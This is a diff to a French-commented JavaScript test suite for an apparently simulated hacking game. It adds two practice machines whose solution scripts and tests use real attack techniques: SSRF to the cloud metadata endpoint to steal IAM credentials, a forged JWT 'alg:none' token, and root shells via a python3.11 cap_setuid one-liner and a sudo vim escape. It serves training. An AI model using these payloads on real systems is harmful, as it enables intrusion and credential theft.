@@ -234,6 +234,36 @@ const MACHINE_SOLUTIONS = {
     run(ctx, "!sh");
     return run(ctx, "cat /root/root.txt");
   },
+  parallax: (ctx) => {
+    run(ctx, "nmap 10.10.11.170");
+    run(ctx, "curl http://10.10.11.170/");
+    run(ctx, 'curl "http://10.10.11.170/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"');
+    run(ctx, 'curl "http://10.10.11.170/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/parallax-deploy-role"');
+    run(ctx, "cloudctl assume-role PXSTS-8f2c91ad4e");
+    run(ctx, "cloudctl get s3://parallax-secure-artifacts/deploy.env");
+    run(ctx, "ssh nrichard@10.10.11.170");
+    pass(ctx, "P4rallax_Deploy_R0le!42");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "getcap -r / 2>/dev/null");
+    run(ctx, "/usr/bin/python3.11 -c \"import os; os.setuid(0); os.system('/bin/sh')\"");
+    return run(ctx, "cat /root/root.txt");
+  },
+  sentry: (ctx) => {
+    run(ctx, "nmap 10.10.11.185");
+    run(ctx, "curl http://10.10.11.185/");
+    run(ctx, "curl http://10.10.11.185/api/token?user=guest");
+    run(
+      ctx,
+      'curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." http://10.10.11.185/api/admin',
+    );
+    run(ctx, "ssh ops_svc@10.10.11.185");
+    pass(ctx, "J_w3ak_Alg_N0ne!87");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo vim -c ':!/bin/sh'");
+    return run(ctx, "cat /root/root.txt");
+  },
   axiom: (ctx) => {
     run(ctx, "nmap 10.10.11.244");
     run(ctx, "curl http://10.10.11.244:8080/");
@@ -249,11 +279,11 @@ const MACHINE_SOLUTIONS = {
   },
 };
 
-section("Machines : recon -> accès -> privesc -> flags (les 8 machines)", () => {
+section("Machines : recon -> accès -> privesc -> flags (les 14 machines)", () => {
   const ctx = freshContext();
   unlockAll(ctx);
   const machines = get(ctx, "MACHINES");
-  assertEqual(machines.length, 12, "12 machines définies dans MACHINES");
+  assertEqual(machines.length, 14, "14 machines définies dans MACHINES");
 
   let totalScoreCheck = 0;
   for (const m of machines) {
@@ -268,11 +298,11 @@ section("Machines : recon -> accès -> privesc -> flags (les 8 machines)", () =>
   }
 
   const finalScore = get(ctx, "GAME.score");
-  // 12 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 12 * 800 = 9600
-  assertEqual(finalScore, 9600, "score total cohérent après les 12 machines (100+150+250+100+200 par machine)");
+  // 14 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 14 * 800 = 11200
+  assertEqual(finalScore, 11200, "score total cohérent après les 14 machines (100+150+250+100+200 par machine)");
 
   const badges = get(ctx, "GAME.badges");
-  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 8 machines");
+  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 14 machines");
 });
 
 section("Lore transversal : note_interne.txt présent sur chaque machine sans fausser le score", () => {
@@ -564,6 +594,114 @@ section("Cloud mal configuré : cloudctl + bucket public (STRATUS)", () => {
   assert(/SSH_PASS=Str4tus_D3ploy!23/.test(leak.text), "cloudctl get lit le fichier du bucket public et fuite les creds");
   const denied = run(ctx, "cloudctl get s3://stratus-internal-keys/id_rsa");
   assert(denied.cls === "t-err", "cloudctl get refuse un objet d'un bucket privé");
+});
+
+// ── 12bis. SSRF -> métadonnées cloud -> rôle IAM -> capability Linux (PARALLAX) ──
+section("SSRF vers métadonnées cloud + rôle IAM + capability Linux (PARALLAX)", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+  run(ctx, "use parallax");
+
+  // Une URL externe/non pertinente ne renvoie rien d'exploitable (egress filtré).
+  const blocked = run(ctx, 'curl "http://10.10.11.170/preview?url=http://example.com/"');
+  assert(!blocked.text.includes("AccessKeyId"), "une URL externe quelconque ne fuit aucun identifiant");
+
+  // La SSRF vers l'endpoint de métadonnées révèle le nom du rôle, puis ses creds temporaires.
+  const roleName = run(ctx, 'curl "http://10.10.11.170/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"');
+  assert(/parallax-deploy-role/.test(roleName.text), "la SSRF vers /security-credentials/ révèle le nom du rôle IAM");
+  const creds = run(ctx, 'curl "http://10.10.11.170/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/parallax-deploy-role"');
+  assert(/PXSTS-8f2c91ad4e/.test(creds.text), "la SSRF vers le rôle révèle un jeton de sécurité temporaire (Token)");
+
+  // Le bucket protégé par rôle refuse tant que le rôle n'est pas assumé.
+  const deniedBefore = run(ctx, "cloudctl get s3://parallax-secure-artifacts/deploy.env");
+  assert(deniedBefore.cls === "t-err" && /rôle IAM/.test(deniedBefore.text), "le bucket à rôle refuse avant assume-role");
+
+  // Un jeton invalide est rejeté ; le bon jeton assume le rôle.
+  const badToken = run(ctx, "cloudctl assume-role JETON-INVALIDE");
+  assert(badToken.cls === "t-err", "un jeton invalide est rejeté par assume-role");
+  const assumed = run(ctx, "cloudctl assume-role PXSTS-8f2c91ad4e");
+  assert(assumed.cls !== "t-err" && /parallax-deploy-role/.test(assumed.text), "le bon jeton assume le rôle IAM");
+
+  // Une fois le rôle assumé, le bucket se lit et fuite des identifiants SSH.
+  const leak = run(ctx, "cloudctl get s3://parallax-secure-artifacts/deploy.env");
+  assert(/SSH_PASS=P4rallax_Deploy_R0le!42/.test(leak.text), "après assume-role, le bucket fuite les identifiants SSH");
+
+  // Accès initial.
+  run(ctx, "ssh nrichard@10.10.11.170");
+  pass(ctx, "P4rallax_Deploy_R0le!42");
+  assertEqual(get(ctx, "SESSION.ctx"), "parallax", "accès SSH obtenu avec les identifiants fuités");
+
+  // Pas de sudo ; getcap révèle la capability sur python3.11.
+  const sudoL = run(ctx, "sudo -l");
+  assert(!/NOPASSWD/.test(sudoL.text), "aucun sudo NOPASSWD sur ce compte");
+  const caps = run(ctx, "getcap -r / 2>/dev/null");
+  assert(/python3\.11 = cap_setuid\+ep/.test(caps.text), "getcap révèle la capability cap_setuid sur python3.11");
+
+  // Un usage voisin (mauvaise syntaxe) ne doit pas déclencher l'exploit.
+  const almost = run(ctx, "/usr/bin/python3.11 -c \"print('hello')\"");
+  assertEqual(get(ctx, "SESSION.user"), "nrichard", "une commande python3.11 quelconque n'élève pas les privilèges");
+
+  // Le bon payload exploite la capability et donne un shell root.
+  run(ctx, "/usr/bin/python3.11 -c \"import os; os.setuid(0); os.system('/bin/sh')\"");
+  assertEqual(get(ctx, "SESSION.user"), "root", "la capability cap_setuid est exploitée avec succès");
+  const flag = run(ctx, "cat /root/root.txt");
+  assert(/FLAG\{parallax_root_capability/.test(flag.text), "flag root PARALLAX capturé via la capability Linux");
+});
+
+// ── 12ter. JWT "alg:none" forgé + vim GTFOBins (SENTRY) ──────────────────────
+section('Authentification JWT "alg:none" forgée (SENTRY)', () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+  run(ctx, "use sentry");
+
+  // Sans en-tête d'autorisation : refus.
+  const noAuth = run(ctx, "curl http://10.10.11.185/api/admin");
+  assert(noAuth.cls === "t-err" && /401/.test(noAuth.text), "l'API admin refuse sans en-tête Authorization");
+
+  // Le jeton de démo (guest, alg HS256) est récupérable et décodable via les filtres pipe.
+  const guestToken = run(ctx, "curl http://10.10.11.185/api/token?user=guest");
+  assert(/^eyJ/.test(guestToken.text.trim()), "le jeton de démo (guest) est récupérable");
+  const guestHeader = run(ctx, 'echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64urld');
+  assert(/"alg":"HS256"/.test(guestHeader.text), "le filtre base64urld décode l'en-tête du jeton de démo");
+
+  // Un jeton avec un rôle insuffisant (même en alg:none) est refusé.
+  const notAdmin = run(
+    ctx,
+    'curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ." http://10.10.11.185/api/admin',
+  );
+  assert(notAdmin.cls === "t-err" && /403/.test(notAdmin.text), "un jeton alg:none avec un rôle insuffisant est refusé");
+
+  // Un jeton signé normalement (alg HS256) mais avec un rôle admin forgé est aussi refusé
+  // (la signature n'est PAS vérifiée seulement quand alg:none — sinon on la respecte).
+  const wrongAlg = run(
+    ctx,
+    'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.abc" http://10.10.11.185/api/admin',
+  );
+  assert(wrongAlg.cls === "t-err", "un jeton avec alg != none et une charge utile admin forgée est refusé");
+
+  // Encodage manuel des deux segments forgés via le filtre base64url (comme un vrai joueur).
+  const encHeader = run(ctx, 'echo -n \'{"alg":"none","typ":"JWT"}\' | base64url');
+  assertEqual(encHeader.text.trim(), "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0", "l'en-tête forgé s'encode correctement en base64url");
+  const encPayload = run(ctx, 'echo -n \'{"user":"admin","role":"admin"}\' | base64url');
+  assertEqual(encPayload.text.trim(), "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ", "la charge utile forgée s'encode correctement en base64url");
+
+  // Le jeton alg:none + rôle admin passe et fuite des identifiants SSH.
+  const forged = `${encHeader.text.trim()}.${encPayload.text.trim()}.`;
+  const admin = run(ctx, `curl -H "Authorization: Bearer ${forged}" http://10.10.11.185/api/admin`);
+  assert(admin.cls !== "t-err" && /J_w3ak_Alg_N0ne!87/.test(admin.text), "le jeton alg:none forgé avec le rôle admin fuite les identifiants SSH");
+
+  // Accès initial.
+  run(ctx, "ssh ops_svc@10.10.11.185");
+  pass(ctx, "J_w3ak_Alg_N0ne!87");
+  assertEqual(get(ctx, "SESSION.ctx"), "sentry", "accès SSH obtenu avec les identifiants fuités par l'API admin");
+
+  // Privesc : sudo -l révèle vim, GTFOBins direct (pas de mode pager).
+  const sudoL = run(ctx, "sudo -l");
+  assert(/vim/.test(sudoL.text), "sudo -l révèle une autorisation NOPASSWD sur vim");
+  run(ctx, "sudo vim -c ':!/bin/sh'");
+  assertEqual(get(ctx, "SESSION.user"), "root", "l'échappement vim GTFOBins donne un shell root direct");
+  const flagSentry = run(ctx, "cat /root/root.txt");
+  assert(/FLAG\{sentry_root_vim/.test(flagSentry.text), "flag root SENTRY capturé via vim GTFOBins");
 });
 
 // ── 13. Webshell upload (NEXUS) : curl -F + reverse shell gated par l'upload ──
